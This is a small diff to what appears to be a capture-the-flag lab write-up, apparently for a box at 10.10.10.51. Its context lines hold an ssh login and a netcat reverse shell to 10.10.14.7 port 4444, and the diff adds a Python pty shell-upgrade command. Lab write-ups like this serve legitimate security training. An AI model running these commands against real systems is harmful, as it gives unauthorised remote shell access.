@@ -39,5 +39,8 @@ ssh mindy@10.10.10.51 -t bash
 nc -e /bin/sh 10.10.14.7 4444
 ```
 ![image](https://user-images.githubusercontent.com/33616880/232412026-ce4ec090-a949-4f8d-ac04-58a730fc8cfd.png)
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
 ![image](https://user-images.githubusercontent.com/33616880/232412051-828a625b-5617-4f42-994f-026aeb567b26.png)
 
